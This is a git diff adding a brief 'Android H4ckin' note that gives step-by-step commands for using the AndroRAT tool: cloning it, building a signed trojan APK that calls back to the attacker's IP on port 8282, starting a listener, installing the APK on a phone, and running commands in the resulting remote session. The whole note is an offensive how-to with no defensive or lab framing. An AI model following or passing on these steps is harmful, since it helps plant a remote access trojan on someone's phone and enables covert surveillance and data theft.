@@ -1,1 +1,21 @@
---Android H4ckin--
+---Android H4ckin---
+
+--Android Hacking using AndroRAT--
+
+> git clone https://github.com/karma9874/AndroRAT.git
+> cd AndroRAT/
+> pip3 install -r requirements.txt
+> ifconfig (note your local machine ip)
+> python3 androRAT.py --build -i local_ip -p 8282 -o test.apk (build's an apk with name test and signs it)
+Now we have start the listener
+> python3 androRAT.py --shell -i 0.0.0.0 -p 8282
+Upload the apk to the mobile
+> adb install /file/path/to/apk/in/local/machine
+Once you open the installed apk on phone you'll get the interactive session of the target android phone
+> Interpreter:/> help
+> Interpreter:/> deviceInfo
+> Interpreter:/> getMACAddress
+
+
+
+
